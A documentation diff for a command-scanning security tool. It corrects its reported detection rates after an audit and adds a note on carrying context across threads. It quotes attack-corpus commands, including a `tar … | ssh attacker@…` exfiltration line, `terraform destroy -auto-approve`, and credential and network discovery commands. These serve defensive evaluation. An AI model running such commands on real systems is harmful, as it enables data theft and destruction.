@@ -21,12 +21,19 @@ flags, and counting flags has a price on the other side: benign prose that
 *quotes* a dangerous command — runbooks, incident reports — blocks at 1 of 89 but
 flags at roughly half.
 
-The denominator is 186 and not 281 because **95 corpus attacks are recognised and
-deliberately left to a policy you write.** `terraform destroy -auto-approve` is
-one: it is the documented inverse of `terraform apply`, teardown automation runs
-it on a schedule, and nothing in the command separates that from the malicious
-use — so the rule names the impact class and hands you the decision. Every one of
-the 95 carries its reason in the corpus file, next to the command.
+The denominator is 186 and not 281 because **95 corpus attacks are deliberately
+left to a policy you write.** `terraform destroy -auto-approve` is one: it is the
+documented inverse of `terraform apply`, teardown automation runs it on a
+schedule, and nothing in the command separates that from the malicious use — so
+the rule names the impact class and hands you the decision. Every one of the 95
+carries its reason in the corpus file, next to the command.
+
+**91 of the 95, not all 95, are recognised.** An independent audit measured that
+four of them classify as `unknown` — `aws sts get-caller-identity`, `netstat
+-antp`, `ss -tulpn` and `docker ps -a` — so there is no impact class for a policy
+to match, and describing them as "recognised and handed to your policy" was
+wrong. They are not detected and not classifiable; see [the four that are neither
+detected nor classified](#the-four-that-are-neither-detected-nor-classified).
 
 Benign side: 0 of 74 benign commands, 0 of 12 templates and 0 of 38 ordinary
 DevOps operations blocked or flagged. Scan latency median 0.43 ms, p95 0.57 ms.
@@ -388,8 +395,9 @@ rate. Benign commands, templates and ordinary DevOps operations are 0 on both
 columns.
 
 The denominator is 186, not 281, and that is the substantive claim on this page.
-Of the 281 attacks in the corpus, **95 are recognised and deliberately left to a
-policy you write**, because the command is genuinely dual-use.
+Of the 281 attacks in the corpus, **95 are deliberately left to a policy you
+write** — 91 of them recognised and classified, four neither (below) — because
+the command is genuinely dual-use.
 `terraform destroy -auto-approve` is the clearest example: it is the documented
 inverse of `terraform apply`, ephemeral-environment automation runs it on a
 schedule, and there is nothing in the command that distinguishes the scheduled
@@ -497,8 +505,16 @@ an enforcement gap rather than a design decision.
 `tar cf - /srv | ssh attacker@…` — **misses, not design decisions**, and the best
 place to contribute.
 
-**And the ones that are recognised and deliberately not caught.** Four discovery
-commands are marked `INTENDED` despite not being detected at all:
+#### The four that are neither detected nor classified
+
+**Corrected after an independent audit.** This section used to describe these
+four as *recognised* and deliberately not caught. That word was false:
+`classify()` returns `unknown` for all four, so they carry no impact class and
+there is nothing for a policy to match. They are marked `INTENDED`,
+which asserts a deliberate decision not to fire — but a deliberate decision not
+to fire on something you have not recognised is not the same claim, and the two
+were being reported as one. Four discovery commands are marked `INTENDED`
+despite being neither detected nor classified:
 `aws sts get-caller-identity`, `docker ps -a`, `netstat -antp` and `ss -tulpn`.
 These are ordinary operational inspection, and the decision not to fire on them
 is on the record: an earlier draft of `escalate.namespace_tool` classified
@@ -1775,7 +1791,20 @@ extract_context(request.headers)
 ```
 
 Two carriers, mirroring distributed tracing. **In-process**, `contextvars` carry
-the chain across async tasks and threads with no app effort. **Cross-boundary**,
+the chain across `await` with no app effort. **They do not cross a raw thread**:
+a plain `ThreadPoolExecutor.submit(work)` starts the worker with an empty
+context, so the chain, the tiers and the inbound mark are gone and a
+`min_chain_tier_above` policy that gated the action on the calling thread will
+allow it in the pool. That is Python's threading semantics, not something this
+package can patch, so wrap the callable instead:
+
+```python
+from concurrent.futures import ThreadPoolExecutor
+from xaidr import propagate_context
+
+with ThreadPoolExecutor() as pool:
+    pool.submit(propagate_context(handle_request), payload)   # chain preserved
+``` **Cross-boundary**,
 the chain rides the standard `traceparent` header plus a companion entry for the
 correlation id and a compact chain header — the same mechanism OpenTelemetry
 uses, reused rather than reinvented. Telemetry records the chain, its depth, and
